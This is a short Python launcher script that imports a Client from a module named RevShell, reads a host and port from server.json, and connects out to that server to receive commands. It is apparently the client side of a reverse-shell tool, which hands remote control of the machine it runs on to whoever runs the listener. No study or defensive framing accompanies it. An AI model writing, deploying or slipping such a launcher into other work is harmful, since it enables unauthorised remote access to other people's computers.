from RevShell import Client
import json

if __name__ == '__main__':
    server = json.loads(open('server.json', 'r').read())
    client = Client(server['host'], server['port'])
    client.connect()
    client.receive()
    client.stop()